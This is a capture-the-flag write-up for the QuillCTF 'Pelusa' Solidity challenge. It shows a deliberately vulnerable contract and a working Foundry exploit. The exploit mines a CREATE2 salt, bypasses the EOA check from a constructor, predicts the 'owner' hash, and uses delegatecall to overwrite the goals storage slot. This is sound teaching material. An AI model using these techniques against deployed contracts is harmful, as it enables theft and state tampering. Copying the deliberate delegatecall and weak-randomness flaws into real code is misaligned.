# Pelusa QuillCTF
## **Challenge**
### Objective of CTF
- change var `goals` to 2
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IGame {
    function getBallPossesion() external view returns (address);
}

// "el baile de la gambeta"
// https://www.youtube.com/watch?v=qzxn85zX2aE
// @author https://twitter.com/eugenioclrc
contract Pelusa {
    address private immutable owner;
    address internal player;
    uint256 public goals = 1;

    constructor() {
        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
    }

    function passTheBall() external {
        require(msg.sender.code.length == 0, "Only EOA players");
        require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");

        player = msg.sender;
    }

    function isGoal() public view returns (bool) {
        // expect ball in owners posession
        return IGame(player).getBallPossesion() == owner;
    }

    function shoot() external {
        require(isGoal(), "missed");
				/// @dev use "the hand of god" trick
        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature("handOfGod()"));
        require(success, "missed");
        require(uint256(bytes32(data)) == 22_06_1986);
    }
}
```

### Inference
 - need to deploy a contract whose address % 100 == 10
 - return `owner` on `getBallPossesion()`
 - return `22_06_1986` as delegate call return data

## **Solution**
 - 
 ```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Pelusa.sol";

contract PelusaTest is Test {
    Pelusa pelusa;
    function setUp() public {
        pelusa = new Pelusa();
    }

    function getAddress(bytes memory bytecode,uint _salt) public view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode))
        );
        return address(uint160(uint(hash)));
    }
    event Deployed(address addr, uint salt);
    function deploy(bytes memory bytecode, uint _salt) public payable returns (address){
        address addr;
        assembly {
            addr := create2(callvalue(),add(bytecode, 0x20),mload(bytecode), _salt )
            if iszero(extcodesize(addr)) {revert(0, 0)}
        }
        emit Deployed(addr, _salt);
        return addr;
    }

    function test() public {
        uint i ;
        bytes memory bytecode = abi.encodePacked(type(Player).creationCode, abi.encode(address(pelusa),address(this)));
        while(uint(uint160(getAddress(bytecode,i))) % 100 != 10){
            // console.log(i,getAddress(bytecode,i),uint(uint160(getAddress(bytecode,i))));
            i++;
        }
        console.log(i,getAddress(bytecode,i),uint(uint160(getAddress(bytecode,i))));
        Player player = new Player{salt:bytes32(i)}(pelusa,address(this));
        pelusa.shoot();
        require(pelusa.goals() == 2,"NOT SOLVED");
    }
}

contract Player{
    Pelusa pelusa;
    address pelusaDeployer;
    uint pelusaDeployedBlockNum = 1;
    constructor (Pelusa _pelusa,address _pelusaDeployer){
        _pelusa.passTheBall();
        pelusa = _pelusa;
        pelusaDeployer = _pelusaDeployer;
    }
    function getBallPossesion() external view returns (address){
        return address(uint160(uint256(keccak256(abi.encodePacked(pelusaDeployer, blockhash(pelusaDeployedBlockNum))))));
    }
    function handOfGod() public {
        assembly {
            sstore(1,2)
            mstore(0,22061986)
            return(0,0x20)
        }
    }
}

 ```

